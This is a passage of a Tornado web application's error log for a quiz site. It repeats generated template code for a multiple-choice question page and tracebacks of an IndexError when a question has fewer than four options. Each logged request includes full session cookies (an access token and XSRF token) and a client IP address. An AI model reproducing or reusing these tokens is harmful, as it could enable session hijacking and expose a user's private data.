 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059ee0d8e4c854802b2dbc1&answers=%5B2%5D&cursor=3&_xsrf=1cb4017f52d340adab7690f63513f0a2', headers={'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Dnt': '1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '89.105.120.34', 'Origin': 'http://www.intheory.co.uk', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFNN1A1OVZtZU5zN2YyOTdOeWNEOHZ0ejYyb3ZaQnExdWJIdHlUMDZVbUMyYXpvU1VxRXpWV1ZrNUhrOEo4VFZJRU0wWkFPampPeWFxNW5vSnkzWkNFZ1pBeEgwRXdaRFpE|1348052806|3985d8d1466122be97d1521ce5e9e02404b570f3; _xsrf=1cb4017f52d340adab7690f63513f0a2; __utma=188782963.2051100369.1348052782.1348052782.1348070864.2; __utmb=188782963.3.10.1348070864; __utmc=188782963; __utmz=188782963.1348052782.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 152.96ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059ee0d8e4c854802b2dbc1&answers=%5B3%5D&cursor=7&_xsrf=1cb4017f52d340adab7690f63513f0a2', headers={'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Dnt': '1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '89.105.120.34', 'Origin': 'http://www.intheory.co.uk', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFNN1A1OVZtZU5zN2YyOTdOeWNEOHZ0ejYyb3ZaQnExdWJIdHlUMDZVbUMyYXpvU1VxRXpWV1ZrNUhrOEo4VFZJRU0wWkFPampPeWFxNW5vSnkzWkNFZ1pBeEgwRXdaRFpE|1348052806|3985d8d1466122be97d1521ce5e9e02404b570f3; _xsrf=1cb4017f52d340adab7690f63513f0a2; __utma=188782963.2051100369.1348052782.1348052782.1348070864.2; __utmb=188782963.3.10.1348070864; __utmc=188782963; __utmz=188782963.1348052782.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 96.33ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059ee0d8e4c854802b2dbc1&answers=%5B3%5D&cursor=17&_xsrf=1cb4017f52d340adab7690f63513f0a2', headers={'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Dnt': '1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '89.105.120.34', 'Origin': 'http://www.intheory.co.uk', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFNN1A1OVZtZU5zN2YyOTdOeWNEOHZ0ejYyb3ZaQnExdWJIdHlUMDZVbUMyYXpvU1VxRXpWV1ZrNUhrOEo4VFZJRU0wWkFPampPeWFxNW5vSnkzWkNFZ1pBeEgwRXdaRFpE|1348052806|3985d8d1466122be97d1521ce5e9e02404b570f3; _xsrf=1cb4017f52d340adab7690f63513f0a2; __utma=188782963.2051100369.1348052782.1348052782.1348070864.2; __utmb=188782963.3.10.1348070864; __utmc=188782963; __utmz=188782963.1348052782.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
